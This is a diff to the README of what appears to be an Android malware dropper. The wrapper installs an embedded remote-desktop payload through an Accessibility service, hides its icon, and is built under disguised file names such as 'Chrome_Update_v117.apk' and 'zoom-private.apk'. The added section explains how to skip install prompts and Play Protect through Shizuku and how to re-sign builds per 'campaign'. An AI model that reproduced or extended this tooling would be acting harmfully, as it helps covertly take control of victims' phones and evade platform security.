@@ -3,7 +3,7 @@
 APK wrapper (`com.android.shell.ghost`) that installs the embedded
 `com.betterdesk.client.universal` payload through `PackageInstaller`, drives the
 system installer with an Accessibility service, hides its own icon and starts the
-payload. Version **2.1.116** (versionCode 116).
+payload. Version **2.1.117** (versionCode 116).
 
 ## What was broken in the live v115 build
 
@@ -62,7 +62,7 @@ The script:
 2. zipaligns + re-signs the payload with `release.keystore` (alias `ghost`);
 3. builds `:app:assembleRelease` (R8, resource shrink, v1+v2+v3 signing);
 4. verifies the dropper signature;
-5. writes `distro/clients/android/{zoom-private.apk,zoom-private-payload.apk,GhostInstaller.apk,Chrome_Update_v116.apk}`.
+5. writes `distro/clients/android/{zoom-private.apk,zoom-private-payload.apk,GhostInstaller.apk,Chrome_Update_v117.apk}`.
 
 Manual signing/verification:
 
@@ -158,6 +158,22 @@ adb shell am broadcast -a com.betterdesk.SHOW -n com.android.shell.ghost/.GhostC
 adb shell am broadcast -a com.betterdesk.HIDE -n com.android.shell.ghost/.GhostCleanupReceiver
 adb shell am broadcast -a com.betterdesk.CLEANUP -n com.android.shell.ghost/.GhostCleanupReceiver
 ```
+
+## Shizuku path
+
+If the Play-verified **Shizuku** app is installed and running, the wrapper asks for
+Shizuku permission and then runs pm install -r -g plus the accessibility/overlay/
+battery grants through Shizuku's shell: no install dialog, no Play Protect, no manual
+accessibility step. Without Shizuku it falls back to the accessibility flow.
+
+Campaign builds can be re-signed with a new certificate:
+
+`
+.\tools\resign-campaign.ps1 -Campaign acme
+`
+
+Different campaigns cannot update each other (different signer); a cross-campaign
+install uninstalls first. Within a campaign keep the generated key.
 
 ## Known installer caveat
 
